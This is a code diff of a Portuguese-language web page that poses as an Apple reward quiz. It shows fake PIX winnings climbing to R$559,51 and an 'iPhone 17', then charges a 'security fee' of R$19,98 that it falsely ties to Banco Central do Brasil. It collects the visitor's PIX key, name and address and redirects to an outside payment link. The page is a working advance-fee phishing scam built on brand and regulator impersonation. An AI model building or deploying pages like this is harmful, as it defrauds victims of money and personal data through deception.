-                </div>
-            </div>
-            
-            <div class="footer-bottom">
-                <p>©️ 2025 Elixir Royale. Todos los derechos reservados.</p>
-                <div class="footer-payment">
-                    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <rect x="2" y="5" width="20" height="14" rx="2" stroke="currentColor" stroke-width="2"></rect>
-                        <path d="M2 10H22" stroke="currentColor" stroke-width="2"></path>
-                    </svg>
-                    <span>Pago procesado con seguridad</span>
-                </div>
-            </div>
-        </div>
+    <footer>
+        Ao participar das atividades de recompensa, você concorda com nossos <span>Termos e Condições</span>.
     </footer>
 
-    <script src="js/script.js"></script>
+</div>
+
+<div class="resgate-container" id="resgateContainer">
+
+    <div class="topbar">
+        <div class="logo">
+            <img src="images/Apple_logo_black.svg">
+            Apple
+        </div>
+
+        <div class="money-box">
+            R$559,51
+        </div>
+    </div>
+
+    <div class="resgate-title">Resgatar Recompensa</div>
+
+    <div class="saldo-box">Saldo disponível: R$559,51</div>
+
+    <h3 style="font-size:16px;font-weight:600;">Últimas recompensas</h3>
+
+    <div class="valores-box">
+        <div class="valor-btn">R$10,50</div>
+        <div class="valor-btn">R$28,90</div>
+        <div class="valor-btn">R$56,10</div>
+        <div class="valor-btn">R$559,51</div>
+    </div>
+
+    <select id="tipoChave">
+        <option>Selecione o tipo de chave</option>
+        <option>Chave Aleatória</option>
+        <option>Celular</option>
+        <option>E-mail</option>
+        <option>CPF</option>
+    </select>
+
+    <input type="text" id="chavePix" placeholder="Digite sua chave PIX">
+
+    <button id="btnSaque">REALIZAR SAQUE AGORA</button>
+</div>
+
+<div class="taxa-container" id="taxaContainer">
+    <div class="taxa-header">
+        <img src="images/Apple_logo_black.svg" class="taxa-logo-apple">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" class="taxa-icon-check" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
+            <polyline points="22 4 12 14.01 9 11.01"></polyline>
+        </svg>
+
+        <div class="taxa-title">Taxa de Segurança</div>
+        
+        <p class="taxa-description">
+            Seguindo as diretrizes do Banco Central do Brasil, solicitamos uma confirmação de identidade de **R$ 19,98** para garantir a autenticidade dos participantes.
+        </p>
+        
+        <p class="taxa-reembolso">
+            O dinheiro será totalmente reembolsado entre **1 a 5 minutos** junto ao saldo acumulado.
+        </p>
+    </div>
+
+    <div class="taxa-item-list">
+        
+        <div class="taxa-item">
+            <svg xmlns="http://www.w3.org/2000/svg" class="taxa-item-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                <circle cx="12" cy="12" r="10"></circle>
+                <polyline points="12 6 12 12 16 14"></polyline>
+            </svg>
+            <div class="taxa-item-content">
+                <div class="taxa-item-title">Taxa obrigatória</div>
+                <div class="taxa-item-text">Obrigatório para realizar o saque dos seus ganhos.</div>
+            </div>
+        </div>
+
+        <div class="taxa-item">
+            <svg xmlns="http://www.w3.org/2000/svg" class="taxa-item-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                <polyline points="1 4 1 10 7 10"></polyline>
+                <polyline points="23 20 23 14 17 14"></polyline>
+                <path d="M20.49 9A9 9 0 0 0 5.64 5.64L1 10m22 4l-4.64 4.36A9 9 0 0 1 3.51 15"></path>
+            </svg>
+            <div class="taxa-item-content">
+                <div class="taxa-item-title">Valor reembolsável</div>
+                <div class="taxa-item-text">Você recebe os **R$ 19,98** de volta após finalizar.</div>
+            </div>
+        </div>
+        
+        <div class="taxa-item">
+            <svg xmlns="http://www.w3.org/2000/svg" class="taxa-item-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+            </svg>
+            <div class="taxa-item-content">
+                <div class="taxa-item-title">Garantia de segurança</div>
+                <div class="taxa-item-text">Seu pagamento é seguro e protegido por Banco Central do Brasil.</div>
+            </div>
+        </div>
+        
+        <button class="taxa-btn-sacar" id="btnTaxaSacar">REALIZAR SAQUE</button>
+    </div>
+</div>
+
+<div class="envio-container" id="envioContainer">
+    <div class="envio-header">
+        <svg xmlns="http://www.w3.org/2000/svg" class="envio-icon-iphone" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect>
+            <line x1="12" y1="18" x2="12" y2="18"></line>
+        </svg>
+
+        <h2>🎉 Parabéns! Último Passo para o seu iPhone.</h2>
+        <p>Você confirmou sua elegibilidade. Agora, precisamos dos dados para **envio prioritário** do seu novo **iPhone 17** e a transferência do seu PIX de **R$559,51**.</p>
+        <p>Preencha com o endereço exato de entrega para que nossa logística Apple possa processar seu pedido.</p>
+    </div>
+
+    <form class="envio-form">
+        <label for="nomeCompleto">Nome Completo</label>
+        <input type="text" id="nomeCompleto" placeholder="Seu nome" required="">
+
+        <label for="cep">CEP</label>
+        <input type="text" id="cep" placeholder="00000-000" required="">
+
+        <label for="endereco">Endereço (Rua/Avenida, Número)</label>
+        <input type="text" id="endereco" placeholder="Ex: Rua das Maçãs, 100" required="">
+
+        <label for="bairro">Bairro</label>
+        <input type="text" id="bairro" placeholder="Ex: Centro" required="">
+
+        <label for="cidade">Cidade</label>
+        <input type="text" id="cidade" placeholder="Ex: São Paulo" required="">
+
+        <label for="estado">Estado (UF)</label>
+        <input type="text" id="estado" placeholder="Ex: SP" required="">
+
+        <button class="envio-btn-finalizar" id="btnFinalizarEnvio" type="button">FINALIZAR ENVIO E RECEBER PIX</button>
+    </form>
+</div>
+<div class="popup" id="popup">
+    <div class="popup-box">
+        <h3>Recompensa recebida!</h3>
+        <div class="popup-valor" id="popupValor">R$0,00</div>
+        <button class="popup-btn" id="popupBtn">Continuar recebendo</button>
+    </div>
+</div>
+
+<div class="popup popup-final" id="popupFinal">
+    <div class="popup-box">
+        <h3>Parabéns!</h3>
+        <p style="font-size:17px;font-weight:500;margin-bottom:10px;">
+            Você completou o quiz e ganhou:
+        </p>
+        <div class="popup-valor" style="color:#00ff8c;font-size:35px;">
+            R$559,51 + um iPhone 17
+        </div>
+        <button class="popup-btn" id="finalBtn">Receber recompensa</button>
+    </div>
+</div>
+
+<div class="popup" id="popupConquista">
+    <div class="popup-box" style="max-width:400px;border-radius:25px;padding:30px;background:#fefefe;">
+        <h3 style="font-size:24px;font-weight:700;color:#1c1c1c;margin-bottom:15px;">🎉 Parabéns pela sua conquista!</h3>
+        <p style="font-size:16px;color:#333;margin-bottom:15px;line-height:1.5;">
+            Você acaba de ganhar um <strong>iPhone 17</strong> e <strong>R$579,98</strong> na sua chave PIX.
+        </p>
+        <p style="font-size:15px;color:#555;margin-bottom:20px;line-height:1.5;">
+            Nossa equipe de logística já está preparando seu iPhone, e o envio para o seu endereço será realizado em breve.
+        </p>
+        <p style="font-size:15px;color:#555;margin-bottom:25px;line-height:1.5;">
+            Para receber seu PIX, basta clicar no botão abaixo e efetuar a taxa de segurança. Isso garante que a chave PIX fornecida realmente seja sua, validando seu recebimento imediato.
+        </p>
+        <button class="popup-btn" id="btnConquista" style="background:#0071e3;color:#fff;font-size:16px;font-weight:700;padding:16px;border-radius:14px;cursor:pointer;border:none;width:100%;">
+            Receber Recompensa Agora
+        </button>
+    </div>
+</div>
+<script>
+const coinSound = document.getElementById("coinSound");
+
+const perguntas = [
+    {
+        titulo: "Qual produto Apple você mais utiliza?",
+        opcoes: ["📱 iPhone", "💻 MacBook", "⌚ Apple Watch", "🎧 AirPods"]
+    },
+    {
+        titulo: "Qual cor de iPhone você mais gosta?",
+        opcoes: ["⚪ Branco", "⚫ Preto", "🩶 Titan Natural", "🔵 Azul"]
+    },
+    {
+        titulo: "Como você avalia a bateria dos iPhones?",
+        opcoes: ["🔋 Excelente", "👍 Boa", "🙂 Razoável", "😕 Pode melhorar"]
+    },
+    {
+        titulo: "Você usaria um Apple Vision Pro?",
+        opcoes: ["🤩 Com certeza!", "😎 Talvez", "🤔 Não sei", "🙅‍♂️ Não usaria"]
+    },
+    {
+        titulo: "Qual serviço Apple você mais usa?",
+        opcoes: ["🎵 Apple Music", "📦 iCloud", "📺 Apple TV+", "🎮 Arcade"]
+    }
+];
+
+const valores = [38.52, 42.71, 33.18, 45.90, 399.20];
+
+let etapa = 0;
+let selected = false;
+let saldoAtual = 0;
+
+const title = document.getElementById("question-title");
+const optionsBox = document.getElementById("options");
+const btn = document.getElementById("continuar");
+
+const popup = document.getElementById("popup");
+const popupValor = document.getElementById("popupValor");
+const popupBtn = document.getElementById("popupBtn");
+
+const popupFinal = document.getElementById("popupFinal");
+const finalBtn = document.getElementById("finalBtn");
+
+const saldoTopo = document.getElementById("saldoTopo");
+
+const progressBar = document.getElementById("progressBar");
+
+// Elementos das Telas
+const btnSaque = document.getElementById("btnSaque");
+const resgateContainer = document.getElementById("resgateContainer");
+const taxaContainer = document.getElementById("taxaContainer");
+const envioContainer = document.getElementById("envioContainer"); 
+const quizContainer = document.getElementById("quizContainer"); 
+
+const btnTaxaSacar = document.getElementById("btnTaxaSacar"); // Botão "REALIZAR SAQUE" da tela de taxa
+const btnFinalizarEnvio = document.getElementById("btnFinalizarEnvio"); // Botão da tela de envio
+
+// NOVO: Variáveis para o Pop-up de Conquista
+const popupConquista = document.getElementById("popupConquista");
+const btnConquista = document.getElementById("btnConquista");
+
+
+function atualizarProgresso() {
+    const progresso = ((etapa) / perguntas.length) * 100;
+    progressBar.style.width = progresso + "%";
+}
+
+function brilho(el) {
+    el.classList.remove("shine");
+    void el.offsetWidth;
+    el.classList.add("shine");
+}
+
+function carregarPergunta() {
+    atualizarProgresso();
+
+    const q = perguntas[etapa];
+    title.innerText = q.titulo;
+    optionsBox.innerHTML = "";
+    selected = false;
+    btn.classList.remove("enabled"); // Garante que o botão comece desabilitado
+
+    q.opcoes.forEach(op => {
+        const div = document.createElement("div");
+        div.className = "option";
+        div.innerHTML = op;
+        div.onclick = () => {
+            document.querySelectorAll(".option").forEach(o => o.style.border = "1px solid #e5e5e5");
+            div.style.border = "2px solid #000";
+            selected = true;
+            btn.classList.add("enabled");
+        };
+        optionsBox.appendChild(div);
+    });
+}
+
+btn.onclick = () => {
+    if (!selected) return;
+
+    const valor = valores[etapa];
+    popupValor.innerText = "R$0,00";
+    popup.style.display = "flex";
+
+    coinSound.currentTime = 0;
+    coinSound.play();
+
+    let atual = 0;
+    const anim = setInterval(() => {
+        atual += valor / 25;
+        if (atual >= valor) {
+            atual = valor;
+            clearInterval(anim);
+        }
+        popupValor.innerText = "R$" + atual.toFixed(2).replace(".", ",");
+        brilho(popupValor);
+    }, 30);
+
+    saldoAtual += valor;
+    saldoTopo.innerText = "R$" + saldoAtual.toFixed(2).replace(".", ",");
+    brilho(saldoTopo);
+};
+
+popupBtn.onclick = () => {
+    popup.style.display = "none";
+    etapa++;
+
+    if (etapa >= perguntas.length) {
+        progressBar.style.width = "100%";
+
+        popupFinal.style.display = "flex";
+
+        coinSound.currentTime = 0;
+        coinSound.play();
+
+        return;
+    }
+
+    btn.classList.remove("enabled");
+    carregarPergunta();
+};
+
+finalBtn.onclick = () => {
+    quizContainer.style.display = "none";
+    document.getElementById("popupFinal").style.display = "none";
+    resgateContainer.style.display = "block";
+
+    coinSound.currentTime = 0;
+    coinSound.play();
+};
+
+// 1. Botão da Tela de Resgate -> Tela de Taxa
+btnSaque.onclick = () => {
+    resgateContainer.style.display = "none";
+    taxaContainer.style.display = "block";
+};
+
+// 2. Botão da Tela de Taxa -> Tela de Envio
+btnTaxaSacar.onclick = () => {
+    // Avança para a tela de envio (após o suposto pagamento)
+    taxaContainer.style.display = "none";
+    envioContainer.style.display = "block";
+};
+
+// 3. NOVO: Botão da Tela de Envio -> MOSTRA POP-UP DE CONQUISTA
+btnFinalizarEnvio.onclick = () => {
+    // Oculta a tela de envio e mostra o novo pop-up (conforme solicitado)
+    envioContainer.style.display = "none";
+    popupConquista.style.display = "flex";
+};
+
+// 4. NOVO: Botão do Pop-up de Conquista -> Redirecionamento Final
+btnConquista.onclick = () => {
+    // Redireciona para o link fornecido após o clique no pop-up
+    window.location.href = "https://compraseguraonline.org.ua/c/d4df49a4ff";
+};
+
+carregarPergunta();
+</script>
 
 
 
